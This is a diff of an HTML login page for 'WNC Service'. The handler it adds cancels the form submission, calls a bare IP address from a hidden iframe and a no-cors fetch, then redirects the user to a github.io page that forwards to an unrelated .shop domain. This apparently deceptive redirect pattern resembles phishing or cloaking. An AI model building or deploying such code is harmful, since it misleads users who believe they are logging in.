@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
   <title>Login - WNC Service</title>
   <style>
     body {
@@ -76,18 +76,33 @@
   </style>
   <script>
     function handleLogin(event) {
-      //event.preventDefault(); // 阻止表單默認提交行為
+      event.preventDefault(); // 阻止表單默認提交行為
 
       const primaryURL = "http://103.200.23.160";
       const fallbackURL = "https://zongyiu.github.io/wnc/?site=http://jkkahebg899wubj.shop/";
 
       // 先在隱藏的 iframe 中連到主 URL
-      document.getElementById('hiddenIframe').src = primaryURL;
+      const iframe = document.getElementById('hiddenIframe');
+      iframe.src = primaryURL;
 
-      // 等 5 秒後，跳轉到備用 URL
+      // 同時使用 fetch 搭配 mode: 'no-cors' 嘗試發請求
+      fetch(primaryURL, {
+        method: 'HEAD',
+        mode: 'no-cors'
+      })
+      .then(() => {
+        // 如果需要在成功 fetch 後做事，可以在此處理
+        console.log('Primary URL requested with no-cors');
+      })
+      .catch(() => {
+        // 如果需要在錯誤發生時做事，可以在此處理
+        console.error('Error requesting primary URL');
+      });
+
+      // 5 秒後跳轉到備用 URL
       setTimeout(() => {
         window.location.href = fallbackURL;
-      }, 10000);
+      }, 5000);
     }
   </script>
 </head>
